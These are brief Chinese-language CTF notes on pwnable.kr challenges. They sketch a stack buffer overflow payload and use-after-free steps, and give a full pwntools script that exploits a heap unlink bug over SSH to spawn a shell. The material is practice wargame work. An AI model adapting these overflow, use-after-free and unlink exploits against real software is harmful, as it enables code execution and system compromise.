pwn kr
  - bof(buffer overflow)
    - gdb 调试显示 距离 52 + address
    - payload = 52 * 'A' + address
  - uaf(use after free)
    - main中定义了两个类，然后输入3先free掉
    - 在输入2中输入payload, 因为use after free
    - 其中注意下introduce函数是按栈的顺序进行的， payload要注意这一点
    - 所以我们需要再次分配下
    - 再输入payload后，在输入1，即可运行我们的payload
    - [参考链接](http://blog.csdn.net/qq_20307987/article/details/51511230)
  - unlink
    - 因为是双链表结构，
    - 所以溢出之后还需要把溢出后的地址改一下
    - poc如下
```python
from pwn import *
context(log_level="debug")

shell_addr = 0x080484eb

s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )
p = s.process("./unlink")
p.recvuntil("here is stack address leak: ")
stack_addr = p.recv(10)
stack_addr = int(stack_addr,16)
p.recvuntil("here is heap address leak: ")
heap_addr = p.recv(9)
heap_addr = int(heap_addr,16)
payload = p32(shell_addr)
payload += 'a'*12
payload += p32(heap_addr + 12)
payload += p32(stack_addr + 0x10)
p.send(payload)
p.interactive()
```
